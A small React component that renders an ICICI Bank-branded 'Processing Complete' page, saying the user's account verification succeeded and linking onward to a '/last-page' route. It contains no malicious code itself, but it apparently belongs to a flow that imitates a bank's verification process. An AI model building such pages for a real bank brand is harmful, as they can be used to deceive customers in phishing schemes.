import React from 'react';
import { useNavigate } from 'react-router-dom';

const ProcessedPage = () => {
  const navigate = useNavigate();

  const handleContinue = () => {
    navigate('/last-page');
  };

  return (
    <div className="container">
      <div className="header">
        <img src="/icici h.jpg" alt="ICICI Bank Logo" />
      </div>

      <div className="content">
        <h2>Processing Complete</h2>
        <div className="notification">
          <p>Your account verification has been processed successfully.</p>
        </div>
        <button className="btn" onClick={handleContinue}>Continue</button>
      </div>

      <div className="footer">
        <p>&copy; ICICI Bank</p>
      </div>
    </div>
  );
};

export default ProcessedPage;
